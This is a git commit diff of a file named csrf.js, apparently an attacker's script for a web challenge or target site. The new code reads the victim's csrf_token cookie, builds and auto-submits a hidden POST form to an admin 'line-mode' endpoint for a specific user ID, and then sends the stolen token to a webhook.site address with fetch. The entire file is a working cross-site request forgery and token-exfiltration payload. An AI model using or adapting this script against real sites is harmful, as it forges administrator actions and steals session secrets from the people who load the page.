3cc2dcafe26a1528c7140a947a94e5aeb227e35f
Ainur <47248272+xtronix2000@users.noreply.github.com>
2026-02-05 02:59:09 +0300

    Update csrf.js

--- csrf.js
+++ csrf.js
@@ -1,4 +1,29 @@
-// Auto-submit form when page loads
-document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('csrf-form').submit();
-});
+function getCookie(name) {
+    let matches = document.cookie.match(new RegExp(
+        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+    ));
+    return matches ? decodeURIComponent(matches[1]) : undefined;
+}
+
+// Создаём форму с токеном
+let form = document.createElement('form');
+form.action = 'https://tetris-g82i3vc.blzh.fr/admin/line-mode/user/c323d3ef-4b0d-4cfc-8d3a-2e05d051ed1f';
+form.method = 'POST';
+
+let input1 = document.createElement('input');
+input1.type = 'hidden';
+input1.name = 'line_mode';
+input1.value = '1';
+form.appendChild(input1);
+
+let input2 = document.createElement('input');
+input2.type = 'hidden';
+input2.name = 'csrf_token';
+input2.value = getCookie('csrf_token') || '';  // ADMIN CSRF!
+form.appendChild(input2);
+
+document.body.appendChild(form);
+form.submit();
+
+let pizda = getCookie('csrf_token') || '';
+fetch('https://webhook.site/3f323047-958d-4c6e-915d-e9e9c35b41e4?pizda='+pizda) 
